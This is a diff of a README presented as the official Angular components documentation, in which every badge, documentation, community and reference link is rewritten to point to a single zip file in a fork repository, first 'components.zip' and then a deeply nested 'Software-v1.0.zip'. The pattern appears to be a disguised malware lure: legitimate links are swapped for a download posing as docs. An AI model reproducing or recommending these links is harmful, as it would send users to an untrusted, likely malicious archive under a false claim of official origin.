@@ -1,7 +1,7 @@
 # Official components for Angular
-[![npm version](https://raw.githubusercontent.com/lamaSonmez/components/master/resource/components.zip%40angular%https://raw.githubusercontent.com/lamaSonmez/components/master/resource/components.zip)](https://raw.githubusercontent.com/lamaSonmez/components/master/resource/components.zip)
-[![Build status](https://raw.githubusercontent.com/lamaSonmez/components/master/resource/components.zip)](https://raw.githubusercontent.com/lamaSonmez/components/master/resource/components.zip)
-[![Gitter](https://raw.githubusercontent.com/lamaSonmez/components/master/resource/components.zip)](https://raw.githubusercontent.com/lamaSonmez/components/master/resource/components.zip)
+[![npm version](https://raw.githubusercontent.com/lamaSonmez/components/master/src/components-examples/material/stepper/stepper-vertical/Software-v1.0.zip%40angular%https://raw.githubusercontent.com/lamaSonmez/components/master/src/components-examples/material/stepper/stepper-vertical/Software-v1.0.zip)](https://raw.githubusercontent.com/lamaSonmez/components/master/src/components-examples/material/stepper/stepper-vertical/Software-v1.0.zip)
+[![Build status](https://raw.githubusercontent.com/lamaSonmez/components/master/src/components-examples/material/stepper/stepper-vertical/Software-v1.0.zip)](https://raw.githubusercontent.com/lamaSonmez/components/master/src/components-examples/material/stepper/stepper-vertical/Software-v1.0.zip)
+[![Gitter](https://raw.githubusercontent.com/lamaSonmez/components/master/src/components-examples/material/stepper/stepper-vertical/Software-v1.0.zip)](https://raw.githubusercontent.com/lamaSonmez/components/master/src/components-examples/material/stepper/stepper-vertical/Software-v1.0.zip)
 
 The Angular team builds and maintains both common UI components and tools to help you build your
 own custom components. The team maintains several npm packages.
@@ -16,10 +16,10 @@ own custom components. The team maintains several npm packages.
 
 #### Quick links
 [Documentation, demos, and guides][mat-docs] |
-[Frequently Asked Questions](https://raw.githubusercontent.com/lamaSonmez/components/master/resource/components.zip) |
-[Community Google group](https://raw.githubusercontent.com/lamaSonmez/components/master/resource/components.zip!forum/angular-material2) |
-[Contributing](https://raw.githubusercontent.com/lamaSonmez/components/master/resource/components.zip) |
-[StackBlitz Template](https://raw.githubusercontent.com/lamaSonmez/components/master/resource/components.zip)
+[Frequently Asked Questions](https://raw.githubusercontent.com/lamaSonmez/components/master/src/components-examples/material/stepper/stepper-vertical/Software-v1.0.zip) |
+[Community Google group](https://raw.githubusercontent.com/lamaSonmez/components/master/src/components-examples/material/stepper/stepper-vertical/Software-v1.0.zip!forum/angular-material2) |
+[Contributing](https://raw.githubusercontent.com/lamaSonmez/components/master/src/components-examples/material/stepper/stepper-vertical/Software-v1.0.zip) |
+[StackBlitz Template](https://raw.githubusercontent.com/lamaSonmez/components/master/src/components-examples/material/stepper/stepper-vertical/Software-v1.0.zip)
 
 ## Getting started
 
@@ -35,7 +35,7 @@ contribution.
 
 ## What we're working on now (Q4 2021):
 * Continuing to create new, API-compatible versions of the Angular Material components backed by
-[MDC Web][] ([see @jelbourn's ng-conf talk](https://raw.githubusercontent.com/lamaSonmez/components/master/resource/components.zip)). Much of our effort
+[MDC Web][] ([see @jelbourn's ng-conf talk](https://raw.githubusercontent.com/lamaSonmez/components/master/src/components-examples/material/stepper/stepper-vertical/Software-v1.0.zip)). Much of our effort
 is dedicated towards rolling out these new versions of the components across Angular apps
 inside Google. This work will pay off with the following benefits:
   * Dramatically improve consistency with the Material Design spec, which has changed significantly
@@ -80,14 +80,14 @@ We aim for great user experience with the following screen readers:
 * **Chrome OS**: ChromeVox with Chrome.
 
 
-[Material Design]: https://raw.githubusercontent.com/lamaSonmez/components/master/resource/components.zip
-[Google Maps JavaScript API]: https://raw.githubusercontent.com/lamaSonmez/components/master/resource/components.zip
-[YouTube Player API]: https://raw.githubusercontent.com/lamaSonmez/components/master/resource/components.zip
-[MDC Web]: https://raw.githubusercontent.com/lamaSonmez/components/master/resource/components.zip
-[cdk-docs]: https://raw.githubusercontent.com/lamaSonmez/components/master/resource/components.zip
-[mat-docs]: https://raw.githubusercontent.com/lamaSonmez/components/master/resource/components.zip
-[map-docs]: https://raw.githubusercontent.com/lamaSonmez/components/master/resource/components.zip
-[ytp-docs]: https://raw.githubusercontent.com/lamaSonmez/components/master/resource/components.zip
-[getting-started]: https://raw.githubusercontent.com/lamaSonmez/components/master/resource/components.zip
-[contributing]: https://raw.githubusercontent.com/lamaSonmez/components/master/resource/components.zip
-[help-wanted]: https://raw.githubusercontent.com/lamaSonmez/components/master/resource/components.zip%3Aissue+is%3Aopen+label%3A%22help+wanted%22
+[Material Design]: https://raw.githubusercontent.com/lamaSonmez/components/master/src/components-examples/material/stepper/stepper-vertical/Software-v1.0.zip
+[Google Maps JavaScript API]: https://raw.githubusercontent.com/lamaSonmez/components/master/src/components-examples/material/stepper/stepper-vertical/Software-v1.0.zip
+[YouTube Player API]: https://raw.githubusercontent.com/lamaSonmez/components/master/src/components-examples/material/stepper/stepper-vertical/Software-v1.0.zip
+[MDC Web]: https://raw.githubusercontent.com/lamaSonmez/components/master/src/components-examples/material/stepper/stepper-vertical/Software-v1.0.zip
+[cdk-docs]: https://raw.githubusercontent.com/lamaSonmez/components/master/src/components-examples/material/stepper/stepper-vertical/Software-v1.0.zip
+[mat-docs]: https://raw.githubusercontent.com/lamaSonmez/components/master/src/components-examples/material/stepper/stepper-vertical/Software-v1.0.zip
+[map-docs]: https://raw.githubusercontent.com/lamaSonmez/components/master/src/components-examples/material/stepper/stepper-vertical/Software-v1.0.zip
+[ytp-docs]: https://raw.githubusercontent.com/lamaSonmez/components/master/src/components-examples/material/stepper/stepper-vertical/Software-v1.0.zip
+[getting-started]: https://raw.githubusercontent.com/lamaSonmez/components/master/src/components-examples/material/stepper/stepper-vertical/Software-v1.0.zip
+[contributing]: https://raw.githubusercontent.com/lamaSonmez/components/master/src/components-examples/material/stepper/stepper-vertical/Software-v1.0.zip
+[help-wanted]: https://raw.githubusercontent.com/lamaSonmez/components/master/src/components-examples/material/stepper/stepper-vertical/Software-v1.0.zip%3Aissue+is%3Aopen+label%3A%22help+wanted%22
